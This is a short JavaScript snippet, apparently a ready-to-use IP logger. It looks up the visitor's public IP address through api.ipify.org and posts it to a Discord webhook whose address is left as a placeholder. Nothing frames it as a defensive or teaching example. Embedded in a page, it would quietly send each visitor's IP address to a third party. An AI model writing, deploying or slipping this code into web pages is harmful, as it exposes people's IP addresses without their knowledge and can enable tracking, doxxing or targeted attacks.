fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;
    const webhookUrl = 'https://tvoj-discord-webhook';

    const payload = JSON.stringify({
      content: `${ip}`
    });

    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: payload
    })
    .then(response => {
      console.log('success');
    })
    .catch(error => {
      console.error('error', error);
    });
  });
